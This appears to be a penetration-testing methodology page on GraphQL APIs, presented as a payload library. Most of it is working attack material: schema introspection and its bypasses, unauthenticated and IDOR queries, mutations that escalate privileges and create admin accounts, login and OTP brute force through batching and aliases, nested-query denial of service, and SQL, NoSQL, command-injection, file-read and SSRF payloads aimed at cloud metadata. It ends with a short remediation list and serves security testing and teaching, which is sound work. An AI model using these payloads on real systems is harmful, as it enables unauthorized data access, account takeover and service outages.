---
title: "GraphQL Security Testing"
date: 2026-02-24
draft: false
---

# GraphQL Security Testing

> **Severity**: High–Critical | **CWE**: CWE-284, CWE-200, CWE-400
> **OWASP**: A01:2021 – Broken Access Control | A05:2021 – Security Misconfiguration

---

## What Is GraphQL?

GraphQL is a query language for APIs where clients specify exactly what data they need. Unlike REST, GraphQL exposes a **single endpoint** (`/graphql`, `/api/graphql`) and allows flexible queries, mutations, and subscriptions. Security issues arise from introspection, missing authorization, batching abuse, and complex query DoS.

```graphql
# Query (read):
query {
  user(id: 1) { name email role }
}

# Mutation (write):
mutation {
  createUser(input: {name: "attacker", role: "admin"}) { id }
}

# Subscription (real-time):
subscription {
  newMessage { content sender }
}
```

---

## Discovery Checklist

- [ ] Find GraphQL endpoint: `/graphql`, `/api/graphql`, `/gql`, `/query`, `/v1/graphql`
- [ ] Try `GET /graphql?query={__typename}` — quick existence check
- [ ] Check introspection: `{__schema{types{name}}}` — enabled in production?
- [ ] Map all types, queries, mutations via introspection
- [ ] Test missing authorization on queries (no auth required for sensitive data)
- [ ] Test IDOR on object IDs in queries
- [ ] Test mutations for privilege escalation (role field, admin flag)
- [ ] Test query batching — send array of queries: `[{query:...},{query:...}]`
- [ ] Test alias-based query multiplication
- [ ] Test deeply nested queries for DoS (no depth/complexity limits)
- [ ] Test introspection bypass (disabled? → try field name guessing)
- [ ] Look for debug fields: `__debug`, `_service`, `sdl`
- [ ] Test HTTP verb: many endpoints accept both GET and POST
- [ ] Check for `Content-Type: application/json` vs `multipart/form-data` (file upload)

---

## Payload Library

### Payload 1 — Introspection Queries

```graphql
# Full schema dump:
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types {
      ...FullType
    }
    directives {
      name description locations args { ...InputValue }
    }
  }
}

fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name description
    args { ...InputValue }
    type { ...TypeRef }
    isDeprecated deprecationReason
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason }
  possibleTypes { ...TypeRef }
}

fragment InputValue on __InputValue {
  name description type { ...TypeRef } defaultValue
}

fragment TypeRef on __Type {
  kind name
  ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } }
}
```

```bash
# Quick introspection via curl:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name kind}}}"}' | python3 -m json.tool

# Get all queries and mutations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name description args{name type{name kind}}}}}}"}' \
  | python3 -m json.tool

# List all mutations:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{mutationType{fields{name description args{name type{name}}}}}}"}' \
  | python3 -m json.tool
```

### Payload 2 — Introspection Bypass Techniques

```bash
# If introspection is blocked → try alternate formats:

# Method suggestion (partial introspection):
{"query": "{__type(name: \"User\") {fields {name type {name}}}}"}

# Typename leak:
{"query": "{__typename}"}

# Field suggestion: send invalid field → error reveals valid fields
{"query": "{ user { invalidField } }"}
# Error: "Did you mean 'email'? 'username'? 'role'?"

# Disable introspection bypass via newlines (some implementations):
{"query": "{\n __schema\n{\ntypes\n{\nname\n}\n}\n}"}

# Via GET request (different parser path):
GET /graphql?query={__schema{types{name}}}

# Fragment-based (bypass regex filters on "__schema"):
{"query": "fragment f on __Schema { types { name } } { ...f }"}

# X-Apollo-Tracing header sometimes re-enables debug:
-H "X-Apollo-Tracing: 1"

# Playground / IDE endpoints (often unrestricted):
GET /graphiql          # GraphiQL
GET /graphql/playground  # Apollo Playground
GET /altair            # Altair client
GET /voyager          # GraphQL Voyager
```

### Payload 3 — Authorization Testing

```bash
# Query without authentication → sensitive data?
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id email role password } }"}'

# IDOR via ID enumeration:
for id in $(seq 1 50); do
  curl -s -X POST https://target.com/graphql \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_LOW_PRIV_TOKEN" \
    -d "{\"query\":\"{ user(id: $id) { id email role privateData } }\"}"
done

# Access another user's private data:
{"query": "{ user(id: 1337) { email billingAddress creditCard } }"}

# Try admin queries with user token:
{"query": "{ adminPanel { users { id email isAdmin } } }"}
{"query": "{ allUsers { nodes { id email passwordHash } } }"}
```

### Payload 4 — Mutation Privilege Escalation

```bash
# Modify own role:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"query":"mutation { updateUser(id: \"MY_ID\", input: {role: \"admin\"}) { id role } }"}'

# Create admin user:
{"query": "mutation { createUser(input: {email: \"attacker@evil.com\", password: \"pass\", role: \"admin\", isAdmin: true}) { id } }"}

# Password reset without token:
{"query": "mutation { resetPassword(email: \"victim@corp.com\") { success } }"}

# Delete another user's data (IDOR via mutation):
{"query": "mutation { deletePost(id: \"VICTIM_POST_ID\") { success } }"}

# Mass assignment in mutation — try extra fields:
{
  "query": "mutation { updateProfile(input: {name: \"test\", isAdmin: true, role: \"superadmin\", verified: true, credits: 99999}) { id name role } }"
}
```

### Payload 5 — Batching / Brute Force via Aliases

```bash
# Query batching — send array of requests (bypasses rate limit per-request):
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[
    {"query": "mutation { login(email:\"admin@corp.com\", password:\"password1\") { token } }"},
    {"query": "mutation { login(email:\"admin@corp.com\", password:\"password2\") { token } }"},
    {"query": "mutation { login(email:\"admin@corp.com\", password:\"password3\") { token } }"}
  ]'

# Alias-based batching in single request:
mutation {
  a1: login(email: "admin@corp.com", password: "password1") { token }
  a2: login(email: "admin@corp.com", password: "password2") { token }
  a3: login(email: "admin@corp.com", password: "password3") { token }
}

# Alias OTP brute-force (all 10000 codes in one request):
# Generate query:
python3 -c "
queries = []
for i in range(10000):
    code = f'{i:04d}'
    queries.append(f'a{i}: verifyOTP(code: \"{code}\") {{ valid }}')
print('mutation {\\n' + '\\n'.join(queries) + '\\n}')
" > brute_otp.graphql
```

### Payload 6 — Query Depth / Complexity DoS

```bash
# Deeply nested query — exponential server-side resolution:
{
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            friends {
              friends {
                id email
              }
            }
          }
        }
      }
    }
  }
}

# Circular fragment DoS:
fragment f1 on User { friends { ...f2 } }
fragment f2 on User { friends { ...f1 } }
{ user(id: 1) { ...f1 } }

# Field duplication:
{ user(id:1) { id id id id id id id id id id id } }

# Python generator for deep nesting:
depth = 20
query = "{ user(id: 1) { " + "friends { " * depth + "id" + " }" * depth + " }"
print(query)
```

### Payload 7 — Information Disclosure

```bash
# Check for debug / tracing fields:
{"query": "{ __typename _service { sdl } }"}  # Apollo Federation SDL
{"query": "{ _entities(representations: []) { __typename } }"}  # Federation
{"query": "{ __schema { description } }"}

# Error messages revealing internals:
{"query": "{ user(id: \"' OR 1=1--\") { id } }"}  # SQLi via GraphQL
{"query": "{ user(id: \"$(id)\") { id } }"}        # CMDi via GraphQL
{"query": "{ fileContent(path: \"/etc/passwd\") { content } }"}  # LFI via field

# Subscription enumeration:
{"query": "subscription { newUser { id email password } }"}

# Check for __resolveType disclosure:
{"query": "{ node(id: \"VXNlcjox\") { __typename ... on User { email role } } }"}
```

### Payload 8 — GraphQL Injection (SQLi/CMDi via Resolver)

```bash
# If resolver passes args directly to SQL:
{"query": "{ user(name: \"admin' UNION SELECT password FROM users--\") { id } }"}
{"query": "{ search(query: \"test' OR '1'='1\") { results } }"}

# NoSQLi via GraphQL:
{"query": "{ users(filter: {email: {$gt: \"\"}}) { nodes { id email } } }"}

# SSRF via GraphQL URL field:
{"query": "{ importProfile(url: \"http://169.254.169.254/latest/meta-data/\") { data } }"}
{"query": "{ webhook(url: \"http://COLLABORATOR_ID.oast.pro/test\") { status } }"}

# SSTI via template field:
{"query": "{ renderEmail(template: \"{{7*7}}\") { output } }"}
```

---

## Tools

```bash
# GraphQL Voyager — visual schema explorer:
# Load introspection result → visual graph of all types/relations

# InQL — Burp Suite extension (essential):
# BApp Store → InQL
# Auto-generates query templates from introspection
# Batch attack mode

# graphw00f — GraphQL engine fingerprinting:
git clone https://github.com/dolevf/graphw00f
python3 graphw00f.py -t https://target.com/graphql

# clairvoyance — schema recovery without introspection:
git clone https://github.com/nikitastupin/clairvoyance
python3 -m clairvoyance -u https://target.com/graphql -w wordlist.txt

# GraphQL cop — security audit tool:
pip3 install graphql-cop
graphql-cop -t https://target.com/graphql

# Dump full schema via introspection:
python3 -c "
import requests, json
r = requests.post('https://target.com/graphql',
    json={'query': open('introspection_query.graphql').read()},
    headers={'Authorization': 'Bearer TOKEN'})
print(json.dumps(r.json(), indent=2))
"

# graphql-path-enum — enumerate hidden paths:
git clone https://github.com/nicowillis/graphql-path-enum

# curl quick tests:
# Check introspection:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}' | jq '.data.__schema.types[].name'

# List all queries:
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{queryType{fields{name}}}}"}' | jq '.data.__schema.queryType.fields[].name'
```

---

## Remediation Reference

- **Disable introspection in production**: configure server to block `__schema` and `__type` queries
- **Query depth limiting**: max 5–10 levels; reject deeper queries
- **Query complexity limits**: assign cost to each field, reject queries above threshold
- **Rate limiting per operation**: limit both batched arrays and aliased queries
- **Authorization at resolver level**: check permissions on every resolver, not just entry point
- **Persistent query allowlisting**: only accept pre-registered query hashes in production
- **Disable batching** if not required by the client application
- **Input validation**: treat GraphQL args as untrusted input (prevent SQL/NoSQL/CMDi injection)

*Part of the Web Application Penetration Testing Methodology series.*
